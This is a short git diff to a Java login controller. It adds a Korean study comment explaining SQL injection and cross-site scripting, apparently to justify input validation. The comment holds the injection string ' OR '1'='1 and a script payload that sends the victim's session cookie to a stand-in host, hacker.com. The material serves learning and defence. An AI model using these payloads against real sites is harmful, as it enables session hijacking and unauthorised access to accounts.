@@ -135,7 +135,27 @@ public class ControllerLogin {
             d.addFlashAttribute("msg", "아이디는 영문과 숫자만 사용할 수 있습니다.");
             return "redirect:/registerPage";
         }
+    /*
+    SQL 인젝션
+    DB를 속여서 내 마음대로 조작하는 공격
+    원리: 사용자가 입력하는 창(ID/PWD 등)에 SQL 구문을 교묘하게 섞어 넣어 서버가 엉뚱한 SQ을 실행시킴
+    아이디 칸에 ' OR '1'='1 을 넣으면 1=1은 항상 참으로 모든 사용자 정보를 조회 및 관리자 권한으로 로그인 성공..!
+    
+    SQL 인젝션을 하기 위해서는 ', -, ;, = 같은 특수문자가 필수
 
+
+    XXS(Cross-Site Scripting)
+    게시판 및 입력창에 악성 스크립트를 심어 다른 사용자의 브라우저에서 실행되게 하는 공격
+    원리: 공격자가 게시글/아이디 등에 <script> 태그를 삽입 -> 데이터가 DB에 저장되었다가 다른 사용자가 그 페이지를 열 때 브라우저가
+    스크립트를 실행
+
+    예시: 게시글 제목: <script>document.location='http://hacker.com/steal?cookie=' + document.cookie;</script>
+    결과: 글을 선택한 일반 사용자의 세션 쿠키(로그인 증표)가 해커의 서버로 전송 -> 이 쿠키를 활용해 사용자인척 로그인 가능
+    (세션 하이재킹)
+       
+    XXS를 하려면 <,>,/ 같은 스크립트용 특수문자가 필수 
+
+    */
 
     /*
     기존 if문 여러번을 사용하면 DB에 조회, 저장하는 2번의 통신을 하지만
